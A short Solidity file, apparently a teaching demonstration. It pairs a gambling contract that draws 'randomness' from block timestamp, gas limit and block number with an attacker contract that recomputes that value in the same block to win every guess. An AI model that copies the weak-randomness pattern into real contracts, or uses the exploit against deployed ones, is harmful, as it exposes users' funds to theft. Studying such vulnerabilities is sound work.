// SPDX-License-Identifier: MIT
          pragma solidity ^0.8.10;

          contract gambleGame {
              uint public guess;

              function random(uint256 _guess) public {
                  uint256 randomnumber = uint256(sha256(abi.encode(block.timestamp))) % block.gaslimit;
                  randomnumber = randomnumber % block.number;
                  require(_guess == randomnumber, "Your guess is incorrect");
                  guess = randomnumber;
              }
          }
   
          contract HackgambleGame {
              function attack(address _target) public returns (uint256) {
                  uint256 _randomnumber = uint256(sha256(abi.encodePacked(block.timestamp))) % block.gaslimit;
                  _randomnumber = _randomnumber % block.number;
                  gambleGame(_target).random(_randomnumber);
                  return _randomnumber;
              }
          }